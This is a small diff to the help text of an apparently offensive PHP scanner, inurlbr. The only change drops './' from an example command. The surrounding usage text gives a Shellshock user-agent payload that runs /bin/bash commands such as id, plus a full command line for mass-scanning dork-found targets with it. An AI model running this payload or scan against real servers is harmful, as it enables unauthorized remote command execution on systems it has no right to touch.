@@ -290,7 +290,7 @@ function __menu() {
       Usage-exploit / SHELLSHOCK:   
       {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
       Complete command:    
-      ./inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
+      inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
  
  {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
      Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
